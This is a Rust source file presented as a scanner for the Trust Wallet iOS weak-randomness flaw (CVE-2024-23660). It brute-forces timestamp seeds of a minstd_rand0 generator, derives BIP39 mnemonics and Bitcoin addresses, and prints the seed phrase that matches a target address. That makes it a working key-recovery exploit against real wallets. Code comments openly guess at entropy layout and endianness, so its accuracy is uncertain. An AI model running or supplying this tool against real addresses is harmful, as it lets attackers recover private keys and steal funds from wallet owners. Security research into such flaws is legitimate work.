use anyhow::Result;
use bip39::Mnemonic;
use bitcoin::bip32::{DerivationPath, Xpriv};
use bitcoin::secp256k1::Secp256k1;
use bitcoin::{Address, Network};
use std::str::FromStr;
use tracing::{info, warn};

/// Trust Wallet iOS Vulnerability Scanner (CVE-2024-23660)
/// Uses std::minstd_rand0 (LCG) seeded with timestamp
pub fn run(target: &str, start_ts: u32, end_ts: u32) -> Result<()> {
    info!("Trust Wallet (iOS/LCG) Vulnerability Scanner");
    info!("PRNG: minstd_rand0 (LCG, a=16807, m=2^31-1)");
    info!("Target: {}", target);
    info!("Scanning timestamps {} to {}...", start_ts, end_ts);

    let secp = Secp256k1::new();
    let network = Network::Bitcoin; // Trust Wallet defaults to Bitcoin for BTC

    // Parse target to check type
    if let Ok(addr) = Address::from_str(target) {
        if !addr.is_valid_for_network(network) {
            warn!(
                "Warning: Target address network mismatch (expected {:?})",
                network
            );
        }
    } else {
        warn!("Warning: Could not parse target address, assuming string match.");
    }

    let mut checked = 0u64;
    let _start_time = std::time::Instant::now();

    for t in start_ts..=end_ts {
        // Seed LCG with timestamp
        let mut rng = MinstdRand0::new(t);

        // Generate 128 bits (16 bytes) of entropy
        // std::generate usually calls rng() multiple times.
        // For 32-bit LCG, we likely need 4 calls to get 128 bits.
        // Or 5 calls?
        // Let's assume 4 calls taking 32 bits each (concatenated).
        // Since LCG outputs values < 2^31, the top bit is always 0?
        // std::minstd_rand0 range is [1, 2147483646].
        // If we simply concatenate, we lose 1 bit per word entropy.
        // Assuming standard C++ std::independent_bits_engine or similar was NOT used,
        // but rather just filling a buffer.
        // We act like `uint32_t entropy[4]; for(i=0..4) entropy[i] = rng();`

        let mut entropy = [0u8; 16];
        for i in 0..4 {
            let val = rng.next_u32(); // Returns 0..2^31-1
                                      // Endianness? Trust Wallet is often LE or Host Endian (likely LE on iOS/ARM).
                                      // Let's try Little Endian.
            entropy[i * 4..i * 4 + 4].copy_from_slice(&val.to_le_bytes());
        }

        if let Ok(mnemonic) = Mnemonic::from_entropy(&entropy) {
            // Standard BIP39 -> Address
            let seed = mnemonic.to_seed("");
            if let Ok(root) = Xpriv::new_master(network, &seed) {
                // Trust Wallet Path: m/44'/0'/0'/0/0
                if let Ok(path) = DerivationPath::from_str("m/44'/0'/0'/0/0") {
                    if let Ok(child) = root.derive_priv(&secp, &path) {
                        let pubkey = child.to_keypair(&secp).public_key();
                        let address = Address::p2pkh(bitcoin::PublicKey::new(pubkey), network);

                        if address.to_string() == target {
                            warn!("\n🎯 FOUND MATCH!");
                            warn!("Timestamp: {}", t);
                            warn!("Mnemonic: {}", mnemonic);
                            warn!("Address: {}", address);
                            return Ok(());
                        }
                    }
                }
            }
        }

        checked += 1;
        if checked.is_multiple_of(500_000) {
            info!("Scanned {} timestamps...", checked);
        }
    }

    info!(
        "Scan complete (checked {} timestamps). No match found.",
        checked
    );
    Ok(())
}

/// Helper: std::minstd_rand0 implementation
/// x_{n+1} = (16807 * x_n) % 2147483647
struct MinstdRand0 {
    state: u32, // Note: State is technically i32 in C++ usually intra-op, but u32 fits?
                // The modulus is 2^31-1.
}

impl MinstdRand0 {
    fn new(seed: u32) -> Self {
        let mut s = seed;
        if s == 0 {
            s = 1;
        } // Seed 0 becomes 1
        Self { state: s }
    }

    fn next_u32(&mut self) -> u32 {
        // Use u64 to prevent overflow during multiplication
        const A: u64 = 16807;
        const M: u64 = 2147483647;

        let product = (self.state as u64) * A;
        self.state = (product % M) as u32;

        self.state
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_minstd_rand0_progression() {
        let mut rng = MinstdRand0::new(1);
        // Standard first value for seed 1 is 16807
        assert_eq!(rng.next_u32(), 16807);
        // Second value: (16807 * 16807) % 2147483647 = 282475249
        assert_eq!(rng.next_u32(), 282475249);
    }

    #[test]
    fn test_trust_wallet_lcg_entropy_size() {
        let mut rng = MinstdRand0::new(12345);
        let mut entropy = [0u8; 16];
        for i in 0..4 {
            let val = rng.next_u32();
            entropy[i * 4..i * 4 + 4].copy_from_slice(&val.to_le_bytes());
        }
        assert_ne!(entropy, [0u8; 16]);
    }
}
